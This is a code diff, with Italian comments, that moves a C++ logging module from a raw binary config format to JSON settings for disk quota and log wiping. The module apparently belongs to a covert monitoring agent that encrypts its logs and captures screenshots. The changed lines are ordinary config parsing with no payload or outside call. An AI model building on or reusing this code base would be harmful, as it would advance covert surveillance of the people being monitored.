@@ -10,6 +10,7 @@
 #include "md5.h"
 #include "explore_directory.h"
 #include "x64.h"
+#include "JSON\JSON.h"
 
 typedef struct {
 	DWORD agent_tag;
@@ -51,6 +52,8 @@ extern BOOL IsGreaterDate(nanosec_time *, nanosec_time *);
 
 // In BitmapCommon
 extern void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality);
+
+extern BOOL HM_ParseConfGlobals(char *conf, JSONObject *obj);
 
 extern aes_context crypt_ctx; // Dichiarata in shared
 extern aes_context crypt_ctx_conf; // Dichiarata in shared
@@ -149,27 +152,17 @@ void LOG_InitCryptKey(BYTE *crypt_material, BYTE *crypt_material_conf)
 // non sulla ricezione di un nuovo file)
 void UpdateLogConf()
 {
-	BYTE *conf_memory;
+	char *conf_memory;
+	JSONObject conf_json, quota;
 
-	conf_memory = HM_ReadClearConf(H4_CONF_FILE);
-
-	// Effettua il parsing del file di configurazione mappato
-	// XXX Non c'e' il controllo che conf_ptr possa uscire fuori dalle dimensioni del file mappato
-	// (viene assunto che la configurazione sia coerente e il file integro)
-	if (conf_memory) {
-		BYTE *conf_ptr;
-
-		// conf_ptr si sposta nel file durante la lettura
-		conf_ptr = (BYTE *)HM_memstr((char *)conf_memory, LOGRP_CONF_DELIMITER);
-		// Legge lo spazio disco minimo
-		READ_DWORD(min_disk_free, conf_ptr);
-		// Legge lo spazio massimo occupabile
-		READ_DWORD(max_disk_full, conf_ptr);
-		// Legge se fare il wiping
-		READ_DWORD(log_wipe_file, conf_ptr);
-
-		SAFE_FREE(conf_memory);
+	conf_memory = HM_ReadClearConfBSON(H4_CONF_FILE);
+	if (conf_memory && HM_ParseConfGlobals(conf_memory, &conf_json)) {
+		quota = conf_json[L"quota"]->AsObject();
+		min_disk_free = (DWORD) quota[L"min"]->AsNumber();
+		max_disk_full = (DWORD) quota[L"max"]->AsNumber();
+		log_wipe_file = (BOOL) conf_json[L"wipe"]->AsBool();
 	}
+	SAFE_FREE(conf_memory);
 }
 
 
